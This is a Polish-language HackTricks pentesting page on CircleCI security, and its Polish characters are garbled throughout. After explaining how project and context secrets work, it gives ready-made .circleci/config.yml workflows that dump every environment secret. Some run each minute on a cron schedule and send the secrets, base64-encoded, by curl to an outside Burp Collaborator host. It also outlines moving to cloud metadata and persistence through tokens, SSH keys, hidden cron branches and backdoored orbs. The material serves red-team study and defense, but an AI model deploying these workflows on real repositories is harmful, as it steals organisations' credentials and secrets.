# Bezpieczestwo CircleCI

<details>

<summary><strong>Naucz si hakowa AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeli chcesz zobaczy swoj **firm reklamowan w HackTricks** lub **pobra HackTricks w formacie PDF**, sprawd藕 [**PLAN SUBSKRYPCJI**](https://github.com/sponsors/carlospolop)!
* Zdobd藕 [**oficjalne gad偶ety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzin PEASS**](https://opensea.io/collection/the-peass-family), nasz kolekcj ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Docz do**  [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **led藕** mnie na **Twitterze**  [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Podziel si swoimi sztuczkami hakerskimi, przesyajc PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

## Podstawowe informacje

[**CircleCI**](https://circleci.com/docs/2.0/about-circleci/) to platforma Continuous Integration, w kt贸rej mo偶na **definiowa szablony**, okrelajc, co chcesz, aby zrobia z kodem i kiedy to zrobi. W ten spos贸b mo偶na **automatyzowa testowanie** lub **wdro偶enia** bezporednio **z gazi g贸wnej repozytorium**, na przykad.

## Uprawnienia

**CircleCI** **dziedziczy uprawnienia** zwizane z kontem github i bitbucket, kt贸re si zalogowao.\
W moich testach sprawdziem, 偶e o ile masz **uprawnienia do zapisu w repozytorium na githubie**, bdziesz m贸g **zarzdza ustawieniami projektu w CircleCI** (ustawia nowe klucze ssh, pobiera klucze api projektu, tworzy nowe gazie z nowymi konfiguracjami CircleCI...).

Jednak musisz by **administratorem repozytorium**, aby **przeksztaci je w projekt CircleCI**.

## Zmienne rodowiskowe i tajemnice

Zgodnie z [**dokumentacj**](https://circleci.com/docs/2.0/env-vars/) istnieje kilka sposob贸w **adowania wartoci do zmiennych rodowiskowych** w ramach przepywu pracy.

### Wbudowane zmienne rodowiskowe

Ka偶dy kontener uruchomiony przez CircleCI bdzie zawsze mia [**okrelone zmienne rodowiskowe zdefiniowane w dokumentacji**](https://circleci.com/docs/2.0/env-vars/#built-in-environment-variables), takie jak `CIRCLE_PR_USERNAME`, `CIRCLE_PROJECT_REPONAME` lub `CIRCLE_USERNAME`.

### Tekst jawny

Mo偶esz je zadeklarowa w postaci tekstu jawnego wewntrz **polecenia**:
```yaml
- run:
name: "set and echo"
command: |
SECRET="A secret"
echo $SECRET
```
Mo偶esz je zadeklarowa w postaci tekstu jawnego w **rodowisku uruchomieniowym**:
```yaml
- run:
name: "set and echo"
command: echo $SECRET
environment:
SECRET: A secret
```
Mo偶esz je zadeklarowa w postaci tekstu jawnego w **rodowisku build-job**:
```yaml
jobs:
build-job:
docker:
- image: cimg/base:2020.01
environment:
SECRET: A secret
```
Mo偶esz je zadeklarowa w postaci tekstu jawnego w **rodowisku kontenera**:
```yaml
jobs:
build-job:
docker:
- image: cimg/base:2020.01
environment:
SECRET: A secret
```
### Tajemnice projektu

S to **tajemnice**, kt贸re bd dostpne tylko dla **projektu** (dla **dowolnej gazi**).\
Mo偶na je zobaczy zadeklarowane w _https://app.circleci.com/settings/project/github/\<org\_name>/\<repo\_name>/environment-variables_

![](<../.gitbook/assets/image (50).png>)

{% hint style="danger" %}
Funkcjonalno "**Importuj zmienne**" pozwala na **importowanie zmiennych z innych projekt贸w** do tego.
{% endhint %}

### Tajemnice kontekstu

S to tajemnice, kt贸re s **dostpne dla caej organizacji**. Domylnie **dowolne repozytorium** bdzie miao dostp do dowolnej tajemnicy przechowywanej tutaj:

![](<../.gitbook/assets/image (80).png>)

{% hint style="success" %}
Nale偶y jednak zauwa偶y, 偶e mo偶na **wybra inn grup** (zamiast Wszyscy czonkowie), aby udostpni tajemnice tylko okrelonym osobom.\
Jest to obecnie jedna z najlepszych metod **zwikszenia bezpieczestwa tajemnic**, aby nie pozwala wszystkim na dostp do nich, ale tylko niekt贸rym osobom.
{% endhint %}

## Ataki

### Wyszukiwanie jawnych tajemnic

Jeli masz **dostp do VCS** (np. github), sprawd藕 plik `.circleci/config.yml` **ka偶dego repozytorium na ka偶dej gazi** i **wyszukaj** potencjalne **jawne tajemnice** przechowywane tam.

### Wyliczanie zmiennych rodowiskowych i kontekstu

Sprawdzajc kod, mo偶na znale藕 **wszystkie nazwy tajemnic**, kt贸re s **u偶ywane** w ka偶dym pliku `.circleci/config.yml`. Mo偶na r贸wnie偶 uzyska **nazwy kontekst贸w** z tych plik贸w lub sprawdzi je w konsoli internetowej: _https://app.circleci.com/settings/organization/github/\<org\_name>/contexts_.

### Wyciek tajemnic projektu

{% hint style="warning" %}
Aby **wyciec WSZYSTKIE** tajemnice projektu i kontekstu, wystarczy mie **dostp do ZAPISU** tylko do **jednego repozytorium** w caej organizacji github (_i twoje konto musi mie dostp do kontekst贸w, ale domylnie ka偶dy ma dostp do ka偶dego kontekstu_).
{% endhint %}

{% hint style="danger" %}
Funkcjonalno "**Importuj zmienne**" pozwala na **importowanie zmiennych z innych projekt贸w** do tego. Dlatego atakujcy m贸gby **zaimportowa wszystkie zmienne projektu z wszystkich repozytori贸w**, a nastpnie **wyciec wszystkie razem**.
{% endhint %}

Wszystkie tajemnice projektu zawsze s ustawiane w rodowisku zada, wic wystarczy wywoa env i zakodowa je w base64, aby wyciec tajemnice w **konsoli dziennika prac przepyw贸w**:
```yaml
version: 2.1

jobs:
exfil-env:
docker:
- image: cimg/base:stable
steps:
- checkout
- run:
name: "Exfil env"
command: "env | base64"

workflows:
exfil-env-workflow:
jobs:
- exfil-env
```
Jeli **nie masz dostpu do konsoli internetowej**, ale masz **dostp do repozytorium** i wiesz, 偶e jest u偶ywany CircleCI, mo偶esz po prostu **utworzy workflow**, kt贸ry jest **uruchamiany co minut** i **wysya poufne dane na zewntrzny adres**:
```yaml
version: 2.1

jobs:
exfil-env:
docker:
- image: cimg/base:stable
steps:
- checkout
- run:
name: "Exfil env"
command: "curl https://lyn7hzchao276nyvooiekpjn9ef43t.burpcollaborator.net/?a=`env | base64 -w0`"

# I filter by the repo branch where this config.yaml file is located: circleci-project-setup
workflows:
exfil-env-workflow:
triggers:
- schedule:
cron: "* * * * *"
filters:
branches:
only:
- circleci-project-setup
jobs:
- exfil-env
```
### Wyciekaj tajemnice kontekstu

Musisz **okreli nazw kontekstu** (to spowoduje r贸wnie偶 wyciek tajemnic projektu):
```yaml
version: 2.1

jobs:
exfil-env:
docker:
- image: cimg/base:stable
steps:
- checkout
- run:
name: "Exfil env"
command: "env | base64"

workflows:
exfil-env-workflow:
jobs:
- exfil-env:
context: Test-Context
```
Jeli **nie masz dostpu do konsoli internetowej**, ale masz **dostp do repozytorium** i wiesz, 偶e jest u偶ywany CircleCI, mo偶esz po prostu **zmodyfikowa workflow**, kt贸ry jest **uruchamiany co minut** i **wysya poufne informacje na zewntrzny adres**:
```yaml
version: 2.1

jobs:
exfil-env:
docker:
- image: cimg/base:stable
steps:
- checkout
- run:
name: "Exfil env"
command: "curl https://lyn7hzchao276nyvooiekpjn9ef43t.burpcollaborator.net/?a=`env | base64 -w0`"

# I filter by the repo branch where this config.yaml file is located: circleci-project-setup
workflows:
exfil-env-workflow:
triggers:
- schedule:
cron: "* * * * *"
filters:
branches:
only:
- circleci-project-setup
jobs:
- exfil-env:
context: Test-Context
```
{% hint style="warning" %}
Po prostu utworzenie nowego pliku `.circleci/config.yml` w repozytorium **nie wystarczy, aby uruchomi proces budowania w CircleCI**. Musisz **wczy go jako projekt w konsoli CircleCI**.
{% endhint %}

### Ucieczka do chmury

**CircleCI** daje Ci mo偶liwo uruchamiania **proces贸w budowania na ich maszynach lub na Twoich wasnych**.\
Domylnie ich maszyny znajduj si w GCP i pocztkowo nie bdziesz w stanie znale藕 nic istotnego. Jednak jeli ofiara uruchamia zadania na **wasnych maszynach (potencjalnie w rodowisku chmurowym)**, mo偶esz znale藕 **punkt kocowy metadanych chmury z interesujcymi informacjami**.

Zauwa偶, 偶e w poprzednich przykadach wszystko byo uruchamiane wewntrz kontenera Docker, ale mo偶esz r贸wnie偶 **poprosi o uruchomienie maszyny wirtualnej** (kt贸ra mo偶e mie inne uprawnienia chmury):
```yaml
jobs:
exfil-env:
#docker:
#  - image: cimg/base:stable
machine:
image: ubuntu-2004:current
```
Lub nawet kontener Docker z dostpem do zdalnej usugi Docker:
```yaml
jobs:
exfil-env:
docker:
- image: cimg/base:stable
steps:
- checkout
- setup_remote_docker:
version: 19.03.13
```
### Wytrwao

* Mo偶liwe jest **tworzenie token贸w u偶ytkownika w CircleCI**, aby uzyska dostp do punkt贸w kocowych API z uprawnieniami u偶ytkownika.
* _https://app.circleci.com/settings/user/tokens_
* Mo偶liwe jest **tworzenie token贸w projekt贸w**, aby uzyska dostp do projektu z uprawnieniami przypisanymi do tokenu.
* _https://app.circleci.com/settings/project/github/\<org>/\<repo>/api_
* Mo偶liwe jest **dodawanie kluczy SSH** do projekt贸w.
* _https://app.circleci.com/settings/project/github/\<org>/\<repo>/ssh_
* Mo偶liwe jest **tworzenie zadania cron w ukrytym branchu** w nieoczekiwanym projekcie, kt贸ry **wycieka** wszystkie **zmienne rodowiskowe kontekstu** codziennie.
* Lub nawet utworzenie w branchu / modyfikacja znanego zadania, kt贸re codziennie **wycieka** wszystkie zmienne kontekstu i **tajniki projekt贸w**.
* Jeli jeste wacicielem GitHub, mo偶esz **zezwoli na niezweryfikowane orby** i skonfigurowa je w zadaniu jako **tyln furtk**.
* Mo偶esz znale藕 **podatno na wstrzyknicie komend** w niekt贸rym zadaniu i **wstrzykn komendy** za pomoc **tajnego** modyfikujc jego warto.

<details>

<summary><strong>Naucz si hakowa AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeli chcesz zobaczy swoj **firm reklamowan w HackTricks** lub **pobra HackTricks w formacie PDF**, sprawd藕 [**PLAN SUBSKRYPCJI**](https://github.com/sponsors/carlospolop)!
* Zdobd藕 [**oficjalne gad偶ety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzin PEASS**](https://opensea.io/collection/the-peass-family), nasz kolekcj ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Docz do**  [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **led藕** mnie na **Twitterze**  [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Podziel si swoimi sztuczkami hakerskimi, przesyajc PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
